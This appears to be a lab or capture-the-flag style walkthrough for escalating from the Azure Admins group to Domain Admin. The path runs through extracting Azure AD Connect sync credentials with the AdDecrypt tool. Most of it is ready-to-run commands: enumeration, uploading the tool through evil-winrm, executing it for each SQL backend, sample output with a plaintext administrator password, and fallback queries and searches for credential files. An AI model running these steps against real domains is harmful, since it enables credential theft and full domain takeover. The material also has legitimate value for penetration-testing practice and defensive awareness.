
## 1. Overview

When a compromised user belongs to the **Azure Admins** group on a domain that runs **Azure AD Connect**, the intended escalation path is extracting the AD sync credentials stored by the AAD Connect service. These credentials are typically **Domain Admin** level, as the sync service needs broad AD read access.

---

### Confirm Azure Admins Membership
```powershell
whoami /groups
# Look for: DOMAIN\Azure Admins
```

### Confirm Azure AD Connect is Installed
```powershell
Get-ADSyncConnector
# or
ls "C:\Program Files\Microsoft Azure AD Sync\"
# Expect: Bin, Data, Extensions, MaData directories
```

### Identify SQL Backend
```powershell
# Check registry for SQL instances
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" 2>$null

# Check Data directory — .mdf files = LocalDB, empty = Full SQL
ls "C:\Program Files\Microsoft Azure AD Sync\Data\"

# Check running processes (if permitted)
Get-WmiObject -Class Win32_Service | Where-Object {$_.Name -like "*sql*"} | Select Name, State

# Azure AD Connect uses LocalDB or a full SQL instance
Get-Service | Where-Object {$_.Name -like "*sql*"}
```

| Finding | Backend | AdDecrypt Flag |
|---|---|---|
| `.mdf` files in Data dir | LocalDB | `AdDecrypt.exe` (no flag) |
| `MSSQLSERVER` in registry, no `.mdf` | Full SQL Server | `AdDecrypt.exe -FullSQL` |

## 2. Azure AD Connect Credential Extraction

### Tool: AdDecrypt
Based on the technique by [@_xpn_](https://blog.xpnsec.com/azuread-connect-for-redteam/).  
Binary: search GitHub for `https://github.com/VbScrub/AdSyncDecrypt`. --> Download an unzip.

### Upload and Execute
```bash
# In evil-winrm session:
upload AdDecrypt.exe C:\Users\<user>\AdDecrypt.exe
upload mcrypt.dll C:\Users\<user>\mcrypt.dll
```

```powershell
# Must run from the AAD Sync Bin directory (needs its DLLs)
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"

# LocalDB backend:
C:\Users\<user>\AdDecrypt.exe

# Full SQL Server backend:
C:\Users\<user>\AdDecrypt.exe -FullSQL
```

### Expected Output
```
======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
======================
Username: administrator
Password: <plaintext_domain_admin_password>
```

## 3. Alternative Paths from Azure Admins

If AdDecrypt doesn't work directly, try these:

```powershell
# Query the ADSync database manually via sqlcmd
sqlcmd -S "(localdb)\.\ADSync" -Q "SELECT * FROM mms_management_agent"

# Check if AAD Connect PowerShell module is available
Get-ADSyncConnector
Get-ADSyncAADPasswordResetConfiguration

# Look for config files with embedded creds
ls "C:\ProgramData\AADConnect\"
ls "C:\Program Files\Microsoft Azure AD Sync\Data\"
Get-ChildItem -Path "C:\Program Files\Microsoft Azure AD Sync\" -Recurse -Include *.xml,*.config,*.json
```

## Quick Reference — Key Indicators

```
Group to look for:    Azure Admins
Service account:      AAD_<random> (description says "Synchronization Service")
Install path:         C:\Program Files\Microsoft Azure AD Sync\
SQL instance:         MSSQLSERVER (full) or ADSync (LocalDB)
Cred files:           azure.xml, *.xml in user .Azure folders
WinRM port:           5985 (required for evil-winrm)
Escalation outcome:   Domain Admin (or equivalent) plaintext credentials
```
